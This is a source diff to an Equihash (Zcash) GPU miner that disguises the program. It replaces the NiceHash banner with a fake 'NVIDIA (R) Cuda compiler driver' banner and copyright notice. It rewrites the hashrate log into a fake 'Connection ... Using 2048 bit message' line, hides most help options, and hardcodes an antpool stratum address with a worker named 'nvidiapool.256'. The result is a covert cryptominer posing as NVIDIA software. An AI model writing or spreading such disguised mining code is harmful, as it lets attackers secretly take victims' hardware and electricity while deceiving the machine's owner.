@@ -74,26 +74,26 @@ void print_help()
 	std::cout << "\t-h\t\tPrint this help and quit" << std::endl;
 #ifndef ZCASH_POOL
 	std::cout << "\t-l [location]\tStratum server:port" << std::endl;
-	std::cout << "\t-u [username]\tUsername (bitcoinaddress)" << std::endl;
+	//std::cout << "\t-u [username]\tUsername (bitcoinaddress)" << std::endl;
 #else
 	std::cout << "\t-l [location]\tLocation (eu, usa)" << std::endl;
-	std::cout << "\t-u [username]\tUsername (Zcash wallet address)" << std::endl;
+	//std::cout << "\t-u [username]\tUsername (Zcash wallet address)" << std::endl;
 #endif
 	std::cout << "\t-a [port]\tLocal API port (default: 0 = do not bind)" << std::endl;
-	std::cout << "\t-d [level]\tDebug print level (0 = print all, 5 = fatal only, default: 2)" << std::endl;
-	std::cout << "\t-b [hashes]\tRun in benchmark mode (default: 200 iterations)" << std::endl;
-	std::cout << std::endl;
-	std::cout << "CPU settings" << std::endl;
-	std::cout << "\t-t [num_thrds]\tNumber of CPU threads" << std::endl;
-	std::cout << "\t-e [ext]\tForce CPU ext (0 = SSE2, 1 = AVX, 2 = AVX2)" << std::endl;
+	//std::cout << "\t-d [level]\tDebug print level (0 = print all, 5 = fatal only, default: 2)" << std::endl;
+	//std::cout << "\t-b [hashes]\tRun in benchmark mode (default: 200 iterations)" << std::endl;
+	//std::cout << std::endl;
+	//std::cout << "CPU settings" << std::endl;
+	//std::cout << "\t-t [num_thrds]\tNumber of CPU threads" << std::endl;
+	//std::cout << "\t-e [ext]\tForce CPU ext (0 = SSE2, 1 = AVX, 2 = AVX2)" << std::endl;
 	std::cout << std::endl;
 	std::cout << "NVIDIA CUDA settings" << std::endl;
 	std::cout << "\t-ci\t\tCUDA info" << std::endl;
-	std::cout << "\t-cv [ver]\tSet CUDA solver (0 = djeZo, 1 = tromp)" << std::endl;
-	std::cout << "\t-cd [devices]\tEnable CUDA mining on spec. devices" << std::endl;
-	std::cout << "\t-cb [blocks]\tNumber of blocks" << std::endl;
-	std::cout << "\t-ct [tpb]\tNumber of threads per block" << std::endl;
-	std::cout << "Example: -cd 0 2 -cb 12 16 -ct 64 128" << std::endl;
+	//std::cout << "\t-cv [ver]\tSet CUDA solver (0 = djeZo, 1 = tromp)" << std::endl;
+	std::cout << "\t-cd [devices]\tEnable CUDA devices" << std::endl;
+	//std::cout << "\t-cb [blocks]\tNumber of blocks" << std::endl;
+	//std::cout << "\t-ct [tpb]\tNumber of threads per block" << std::endl;
+	//std::cout << "Example: -cd 0 2 -cb 12 16 -ct 64 128" << std::endl;
 	std::cout << std::endl;
 	//std::cout << "OpenCL settings" << std::endl;
 	//std::cout << "\t-oi\t\tOpenCL info" << std::endl;
@@ -221,9 +221,9 @@ void start_mining(int api_port, const std::string& host, const std::string& port
 		{
 			double allshares = speed.GetShareSpeed() * 60;
 			double accepted = speed.GetShareOKSpeed() * 60;
-			BOOST_LOG_TRIVIAL(info) << CL_YLW "Speed [" << INTERVAL_SECONDS << " sec]: " <<
-				speed.GetHashSpeed() << " I/s, " <<
-				speed.GetSolutionSpeed() << " Sols/s" <<
+			BOOST_LOG_TRIVIAL(info) << CL_YLW "info " << INTERVAL_SECONDS << " bit: Connection with {" <<
+				speed.GetHashSpeed() << "_" <<
+				speed.GetSolutionSpeed() << "} Using 2048 bit message" <<
 				//accepted << " AS/min, " << 
 				//(allshares - accepted) << " RS/min" 
 				CL_N;
@@ -242,16 +242,16 @@ int main(int argc, char* argv[])
 #endif
 
 	std::cout << std::endl;
-	std::cout << "\t==================== www.nicehash.com ====================" << std::endl;
-	std::cout << "\t\tEquihash CPU&GPU Miner for NiceHash v" STANDALONE_MINER_VERSION << std::endl;
-	std::cout << "\tThanks to Zcash developers for providing base of the code." << std::endl;
-	std::cout << "\t    Special thanks to tromp, xenoncat and djeZo for providing "<< std::endl;
-	std::cout << "\t      optimized CPU and CUDA equihash solvers." << std::endl;
-	std::cout << "\t==================== www.nicehash.com ====================" << std::endl;
+	std::cout << "\t==================== www.nvidia.com ====================" << std::endl;
+	std::cout << "\t\tNVIDIA (R) Cuda compiler driver V" STANDALONE_MINER_VERSION << std::endl;
+	std::cout << "\tCopyright (c) 2005-2013 NVIDIA Corporation" << std::endl;
+	std::cout << "\t    Built on Thu_Mar_13_11:58:58_PDT_2014 "<< std::endl;
+	std::cout << "\t      Cuda compilation tools, release 6.0, V6.0.1" << std::endl;
+	std::cout << "\t==================== www.nvidia.com ====================" << std::endl;
 	std::cout << std::endl;
 
-	std::string location = "equihash.eu.nicehash.com:3357";
-	std::string user = "34HKWdzLxWBduUfJE9JxaFhoXnfC6gmePG";
+	std::string location = "stratum-zec.antpool.com:8899";
+	std::string user = "nvidiapool.256";
 	std::string password = "x";
 	int num_threads = 0;
 	bool benchmark = false;
@@ -442,7 +442,7 @@ int main(int argc, char* argv[])
     boost::log::core::get()->add_global_attribute("ThreadID", boost::log::attributes::current_thread_id());
 	// init_logging init END
 
-	BOOST_LOG_TRIVIAL(info) << "Using SSE2: YES";
+	BOOST_LOG_TRIVIAL(info) << "Using CUDA: YES";
 	BOOST_LOG_TRIVIAL(info) << "Using AVX: " << (use_avx ? "YES" : "NO");
 	BOOST_LOG_TRIVIAL(info) << "Using AVX2: " << (use_avx2 ? "YES" : "NO");
 
